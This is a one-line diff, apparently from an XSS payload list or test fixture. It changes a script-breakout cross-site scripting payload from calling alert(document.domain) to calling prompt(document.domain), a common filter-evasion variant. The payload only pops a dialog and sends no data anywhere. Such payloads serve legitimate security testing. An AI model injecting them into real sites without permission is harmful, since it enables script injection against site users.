@@ -1,1 +1,1 @@
-"></script><script>alert(document.domain)</script>
+"></script><script>prompt(document.domain)</script>
